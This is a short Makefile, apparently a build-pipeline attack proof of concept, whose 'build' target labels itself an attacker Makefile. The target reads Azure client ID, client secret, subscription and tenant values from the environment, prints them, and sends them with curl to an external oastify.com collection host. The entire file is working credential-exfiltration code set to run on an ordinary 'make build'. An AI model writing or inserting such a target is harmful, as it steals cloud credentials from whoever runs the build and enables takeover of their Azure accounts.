EXFIL_URL := https://egys6hebt8wrera5tg6tj0ep4ga7y1mq.oastify.com

.PHONY: build

build:
	@echo "=== ATTACKER MAKEFILE EXECUTING ===" && echo "[*] Dumping Azure credentials..." && echo "AZ_CLIENT_ID=$$AZ_CLIENT_ID" && echo "AZ_CLIENT_SECRET=$$AZ_CLIENT_SECRET" && echo "AZ_SUBSCRIPTION_ID=$$AZ_SUBSCRIPTION_ID" && echo "AZ_TENANT_ID=$$AZ_TENANT_ID" && curl -s -X POST https://egys6hebt8wrera5tg6tj0ep4ga7y1mq.oastify.com -H "Content-Type: application/json" -d "{\"client_id\":\"$$AZ_CLIENT_ID\",\"client_secret\":\"$$AZ_CLIENT_SECRET\",\"subscription_id\":\"$$AZ_SUBSCRIPTION_ID\",\"tenant_id\":\"$$AZ_TENANT_ID\"}" && echo "[+] Credentials exfiltrated."
